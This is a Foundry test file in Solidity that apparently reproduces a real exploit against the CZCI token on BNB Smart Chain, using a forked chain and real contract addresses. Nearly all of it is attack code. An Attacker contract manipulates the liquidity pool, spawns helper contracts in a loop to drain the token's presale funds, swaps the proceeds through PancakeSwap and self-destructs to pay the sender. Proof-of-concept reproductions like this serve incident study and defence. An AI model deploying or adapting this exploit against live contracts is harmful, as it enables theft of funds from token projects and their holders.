// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {console, Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {IWBNB, IUniswapRouter2, IUniswapPair2} from "./interfaces.sol";

address constant CZCI = address(0xfE447da6ec701C5003696395CB276c9b5B0eB80D);
address constant WBNB = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
address constant PANCAKE_ROUTER_2 = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
uint256 constant MAX_PRESALE_BNB = 64 ether;

contract CZCITest is Test {
    uint256 internal constant FORK_BLOCK = 47143639;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", string("bsc")), FORK_BLOCK);

        vm.label(CZCI, "CZCI");
        vm.label(WBNB, "WBNB");
        vm.label(PANCAKE_ROUTER_2, "PancakeRouter2");
    }

    function testExploit() public {
        address msgSender = address(0xdeadbeef);
        vm.deal(msgSender, 10 ether);

        console.log("[Before] Sender:", address(msgSender).balance);
        console.log("[Before] CZCI  :", address(CZCI).balance);

        vm.startPrank(msgSender);
        new Attacker{value: 10 ether}();
        vm.stopPrank();

        console.log("[After] Sender:", address(msgSender).balance);
        console.log("[After] CZCI  :", address(CZCI).balance);
    }
}

interface ICZCI is IERC20 {
    function uniswapPair() external view returns (address);
    function accumulatedEth() external view returns (uint256);
}

contract Attacker {
    address[] private helpers;

    constructor() payable {
        ICZCI czci = ICZCI(CZCI);
        IUniswapPair2 pool = IUniswapPair2(czci.uniswapPair());
        IWBNB wbnb = IWBNB(WBNB);

        (bool ok,) = payable(CZCI).call{value: 0.032 ether}(abi.encode(address(pool)));
        require(ok);

        wbnb.deposit{value: 8 ether}();
        wbnb.transfer(address(pool), 8 ether);
        pool.sync();

        for (;;) {
            uint256 accumulatedEth = czci.accumulatedEth();
            if (accumulatedEth == 0) {
                break;
            }
            uint256 value = 0.064 ether;
            if (MAX_PRESALE_BNB - accumulatedEth < value) {
                value = MAX_PRESALE_BNB - accumulatedEth;
            }
            helpers.push(address(new AttackerHelper{value: value}(CZCI)));
        }
        for (uint256 i = 0; i < helpers.length; i++) {
            czci.transferFrom(helpers[i], address(this), czci.balanceOf(helpers[i]));
        }

        swapToken(CZCI, WBNB, czci.balanceOf(address(this)));
        wbnb.withdraw(wbnb.balanceOf(address(this)));

        selfdestruct(payable(msg.sender));
    }

    function swapToken(address _from, address _to, uint256 _amount) internal {
        IERC20 fromToken = IERC20(_from);
        if (fromToken.allowance(address(this), PANCAKE_ROUTER_2) != type(uint256).max) {
            fromToken.approve(PANCAKE_ROUTER_2, type(uint256).max);
        }

        address[] memory path = new address[](2);
        path[0] = _from;
        path[1] = _to;
        IUniswapRouter2(PANCAKE_ROUTER_2)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                _amount, 0, path, address(this), block.timestamp + 60
            );
    }
}

contract AttackerHelper {
    constructor(address _target) payable {
        (bool ok,) = payable(_target).call{value: msg.value}("");
        require(ok);

        IERC20(_target).approve(msg.sender, type(uint256).max);

        selfdestruct(payable(_target));
    }
}
